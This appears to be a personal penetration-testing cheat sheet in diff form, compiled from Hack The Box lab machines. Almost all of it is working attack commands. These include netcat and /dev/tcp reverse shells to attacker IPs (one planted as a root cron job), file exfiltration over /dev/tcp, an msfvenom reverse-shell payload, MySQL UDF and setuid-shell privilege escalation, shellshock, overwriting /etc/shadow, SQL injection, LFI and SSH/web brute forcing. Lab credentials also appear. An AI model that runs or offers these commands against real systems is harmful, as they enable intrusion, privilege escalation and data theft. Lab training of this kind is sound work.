+ cewl http://10.10.10.150/ -m 5 -w cewl.txt
+
+#wfuzz with cookie and post_data
+
+  wfuzz -c -u  http://10.10.10.150/administrator/ -w User_Name.txt -d "username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&dbfbb4aa6c1c2164b1b6198c02aa3c96=1" -b "99fb082d992a92668ce87e5540bd20fa=euskk5s6g4kdv2f5c807vdlnqp; c0548020854924e0aecd05ed9f5b672b=unj6b5gna80nbj81gvkn2o4iih"
+
+#keep in mind 
+
+if you want to scan deep port then remembet use -Pn 
+nmap -Pn -p- -sV <ip> 
+
+# Best Searhching command 
+
+ find . -type f -exec wc -l {} \; | sort -urn
+
+
+#patator tool correct 
+
+patator  ssh_login host=10.10.10.76 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top207.txt port=22022 -x ignore:fgrep='failed.'
+
+#How to find exact hash 
+
+$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB
+
+#There is few tips first you should check that "$5$" ok.. on hashcat --example >> 7400
+
+............................................................
+
+
+#how to use sleep command 
+
+sleep 5; sudo wget 10.10.14.8:8000/troll -o /root/troll     
+
+#SMB server enumeration 
+smbclient -L //10.10.10.111
+
+
+#mysql to get root
+
+mysql> use mysql;
+mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+mysql> select sys_exec('chmod u+s /bin/bash');
+bash -p 
+
+
+# how to decrypt random hash 
+ http://dcode.fr 
+
+#Intresting command remove all space very fast through global command 
+ 
+ s/ //g 
+
+
+# How to use smbmap tool 
+
+ smbamp -H 10.10.10.111 >  log.output
+ smbmap -H 10.10.10.111 -s print$       
+
+# how to decrypt base64 file 
+
+  base64 -d base64.hash > Crack_base 
+
+#Remeber these hash is ascii file
+
+4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+
+# Decrypt above hash 
+cat index.php | xxd -r -p
+
+#How to make connection client and server 
+
+<?php system('uname -a');?>
+
+#Run onile compile any c java program 
+
+https://onecompiler.com/c
+
+#How to print 100 dumy in python 
+python -c 'print "A"*100' 
+
+#curl get reverse shell 
+
+curl http://10.10.10.150/index.php -G --data-urlencode 'pentest=rm
+/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f
+
+
+#If you want to take root auto execute file then you should use crontab feature 
+
+* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 9001 >/tmp/f 
+
+#what is Decoding Vigenere ciphers
+
+#How to connect mail servier stmp 25
+
+1. telnet brainfuck.htb 143
+2. a1 LOGIN orestis kHGuERB29DNiNE
+3. a2 LIST "" "*"
+4. a3 EXAMINE INBOX
+5. a4 FETCH 1 BODY[]
+6. a5 FETCH 2 BODY[]
+
+
+#How to use dirb tool 
+
+dirb --url https://valentine.htb -X .txt /usr/share/wordlists/dirb/big.txt 
+
+#How to use nmap through script 
+
+nmap -p 443 --script=ssl-heartbleed.nse 10.10.10.79
+
+#How to decrypt keypass password in image 
+
+stegcracker omg.jpg /usr/share/wordlists/rockyou.txt 
+
+#How to use dig enumeration commnad 
+ 
+dig axfr cronos.htb @10.10.10.13
+
+#Bypass SQL Injection only 10 Sec
+
+ wfuzz -c -u http://admin.cronos.htb/  -d 'username=FUZZ&password=password' -w /opt/Sql_Inection/sql_injection.txt  --hc 200
+
+
+# How to use sql injection through burpsuit 
+
+ sqlmap -r sql.req 
+
+# How to hack any website and wordpress domain and url 
+gobuster dir --url https://rohitsonkar.in/ -w /usr/share/wordlists/rockyou.txt --no-error --delay 1500ms
+
+
+#Best website for Hash Decode 
+https://www.dcode.fr/hash-function
+
+#ssh bruteforce attack on ssh 
+hydra -l noulis -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.13:22  -t 4  
+
+
+##########################################################################################
+Very Import for cronjob without user 
+
+1)chown root:root /tmp/pen; chmod 4755 /tmp/pen
+2) #include<unistd.h>
+void main() 
+{
+ setuid(0);
+ setgid(0);
+ system("/bin/sh");
+}
+
+>> pen 
+3) gcc -o pen.c pen 
+
+#generate shadow and passwd password 
+
+ mkpasswd -m sha-512 newpasswordhere 
+
+
+#How to generate buffer overflow bad character 
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.14.4 LPORT=1234 -f c -b "\x0a\x0d\x00" 
+
+
+#How to send mail through tailnet without thunderbird 
+
+ telnet 10.10.10.51 110 <pop3>
+
+ USER mindy 
+ PASS password 
+#how to check all mail 
+
+ LIST 
+ RETR 2 <NUMBER choose as depend you
+
+#how to bypass rbash restricted bash 
+
+ -t 'bash --noprofile'
+
+#smb Dept enumeration file and folder 
+smbmap -H 10.10.10.123 -d FRIENDZONE -R --depth 5 
+
+# login username and password 
+
+  smbmap -H 10.10.10.123 -d FRIENDZONE -u admin -p 'WORKWORKHhallelujah@#' 
+
+#Get Login on smb through smbclient
+ 
+ smbclient //10.10.10.123/general/ 
+
+
+#clean massi out put only one menute 
+
+cat host_file | grep friendzone | grep IN  | awk '{print $1}' | sed 's/\.$//g'   
+
+#this is very smart work 
+
+dig axfr @10.10.10.123 friendzone.red friendzoneportal.red  >  both dns
+
+#very smart command for vi text editor view
+
+%s/\n/ /g >>>  space line
+
+#How to check system important service 
+
+netstat -anlp | grep LIST
+
+#Mysql exploit without password #service exploit
+
+ mysql, anyservice called service exploit 
+
+Usage:
+ * $ id
+ * uid=500(raptor) gid=500(raptor) groups=500(raptor)
+ * $ gcc -g -c raptor_udf2.c
+ * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+ * $ mysql -u root -p
+ * Enter password:
+ * [...]
+ * mysql> use mysql;
+ * mysql> create table foo(line blob);
+ * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
+ * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+ * mysql> create function do_system returns integer soname 'raptor_udf2.so';
+ * mysql> select * from mysql.func;
+ * +-----------+-----+----------------+----------+
+ * | name      | ret | dl             | type     |
+ * +-----------+-----+----------------+----------+
+ * | do_system |   2 | raptor_udf2.so | function |
+ * +-----------+-----+----------------+----------+
+ * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
+ * mysql> \! sh
+ * sh-2.05b$ cat /tmp/out
+ * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+ * [...]
+
+
+
+#shadow hash : between second : 
+
+$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.
+
+#how to generate any hash through hashcat example
+
+ mkpasswd -m sha-512 sandeep   
+
+ # you can use any medium 
+
+#How to search file in bunch of lots of directory 
+
+ ls | find . |grep -i nmap 
+
+#what is ldap 
+ LDAP (which is what people call it) is a modern and popular Internet directory access protocol used by many systems and services. Most Windows users will encounter it because Microsoft's NetMeeting uses and opens the LDAP port 389 while it is running.
+
+#how to enumerate ldap service 
+
+ldapsearch -H  ldap://<ip> -x 
+ldapsearch -H  ldap://10.10.10.119 -x -s base namingcontexts
+ldapsearch -H ldap://10.10.10.119 -x -b 'dc=lightweight,dc=htb'
+
+
+#How to become a smart work suid-enumeration with smart work 
+
+ for ip in $(cat suid.txt); do ls -l $ip; done
+
+#tcpdump capabilities.....
+
+ find information using ... 
+ 
+ get /usr/sbin/tcpdump
+
+# best capabilites website
+
+https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/
+
+#Linux capabilites.........
+
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/mtr = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/user/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/user/openssl =ep
+
+
+#wireshark pacakte capture live through ssh linux capabilites 
+
+ ssh user@10.10.10.119 /usr/sbin/tcpdump -i lo -U -s0 -w - 'not port 22' | wireshark -k -i -
+
+
+#smart file transfer through netcat 
+
+cat backup.7z > /dev/tcp/10.10.14.7/1234
+
+nc -nvlp 1234 > backup.7z
+
+#how to extract file through 7zip 
+
+7z x back.7zip 
+
+extrack 7z hash using 7z2john 
+
+
+#linux capabilites 
+
+ tcpdump >>> getcap tcpdump 
+ openssl >>> getcap openssl
+
+#how to write in shadow through openssl 
+
+/home/ldapuser1/openssl enc -in /home/ldapuser1/shadow -out /etc/shadow
+
+#best directory scanning through gobuster 
+
+ gobuster dir --url http://10.10.10.56/cgi-bin/ -x sh php -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 
+
+#shellshock
+
+ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"  http://10.10.10.56/cgi-bin/user.sh 
+
+#How to use sqlmap 
+
+sqlmap -u "http://10.10.10.46/dashboard.php?search="  --cookie="PHPSESSID=gba8leluf3mufo6hj0tlo3fj34" -D public -T cars --dump
+
+
+#UPgrade to tty shell without session expire stop time linux shell 
+
+SHELL=/bin/bash script -q /dev/null
+
+#bash shell get reverse shell
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
+
+#bruteforce attack through hydra 
+
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.46 https-post-form "/cdn-cgi/login/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
+
+
+#adavance grep system 
+
+grep -B5 -A4 -i password 'PRTG Configuration.old' | sed 's/ //g' | sort -u 
+
+#how to encode powershel 
+
+powershel.ps1 | iconv -t UTF-16LE | base64 -w0 
+
+
+#How to use advantage path variable 
+
+# THIS WIll define starting path 
+
+export PATH=/tmp:$PATH
+
+# Ending path define 
+
+export PATH=$PATH:/tmp
+
+#privilege of cat 
+
+echo '/bin/sh' > cat 
+chmod +x cat 
+
+#how to use hydra for tomcat jsp server admin bypass 
+
+hydra -C /usr/share/wordlists/dirb/tomcat_colon.txt  -f 10.10.10.95 -s 8080 http-get /manager/html
+
+#How find Lfi file inclusion vulnerbility on poorly written web_server 
+
+http://10.10.10.55/?file=../../../../../../../../etc/passwd
+
+#traceroute command trace website server 
+
+traceroute pentestblog.in 
+whois pentestblog.in 
+
+#how to ping website hping3 command 
+
+hping3 -c 3 10.10.10.55 
+
+
+#how to find extact bugs through nmap scannning
+
+nmap  --script smb-vuln* -p 445  10.10.10.40 
+
+
+#windows basic command 
+
+#systeminfo 
+#tasklist
+#hostname
+#ver
+#echo %username%
+#whoami 
+#whoamo /priv 
+#whoami /groups 
+#net user
+#icacls <program_name>
+#wmic product 
+#ipconfig
+#netstat -ano 
+#arp -a
+#ipconfig all/
+
+Basic scanning namp #nmap 
+
+nmap --scirpt smbscript -p 445,139 10.10.10.100 
+nmap -sU 10.10.10.100
+
+#smb-top-command
+
+smbmap -H 10.10.10.100 -R --depth 5 
+
+#How to decrypt windows group.xml file 
+
+ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+	
+#Active Directory Scanning 
+
+enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
+smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
+smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
+
+
+#nmap script searching through locate very fast 
+
+locate ".nse" | xargs grep categories| grep safe | grep smb
+
+
+#smb emuneration 
+
+ smbmap -H 10.10.10.100 -R Replication --depth 5
+
+#smbmap Download All file 
+
+└─#  smbclient //10.10.10.100/Replication
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> mget *
+NT_STATUS_NO_SUCH_FILE listing \*
+smb: \> recurse on 
+smb: \> prompt off
+smb: \> mgegt * 
+mgegt: command not found
+smb: \> mget *
+
+
+#deep enemeration through smbmap 
+
+smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -d active.htb -H 10.10.10.100 -R Users
+
+#How to copy one file to another folder fastly 
+
+cat reverse_shell.php | xclip -selection clipboard
+
+#nmap -scanning 
+
+nmap -sC -sV -p- --min-rate=1000 -oA nmap/all_port 10.10.10.29 -T4  
+
+#how to add note in terminal using script 
+
+script pentestblog.log
+
+
+#How to find any file in whole terminal large file 
+
+grep -R 4.0.5 | awk -F:'{print $1}' | uniq
+
+#How to downlaod all image using wget 
+
+wget -r -nd -A jpeg,jpg,bmp,gif,png   http://10.10.10.68/images/
+
+#How to Download all file in one directory 
+
+wget -rnd  http://10.10.10.68/images
+
+
+#How to check log in browser 
+
+http://10.10.10.84/browse.php?file=/var/log/httpd-access.log 
+
+#How to use base64 in php 
+
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+
+
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+#smart command 
+
+ grep -Ril "sunday" .  >>>>>>>> find smart word in any txt file 
+
+#smart command 
+
+ find . -type f -exec wc -l {} \; >>>> find word in txt directory 
+
+#>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+#Remember 
+
+If any ubuntu or linux boxes is old and set any keyexchange algorithm then hydra is not working you can patator tool 
+
+
+
+
+
+
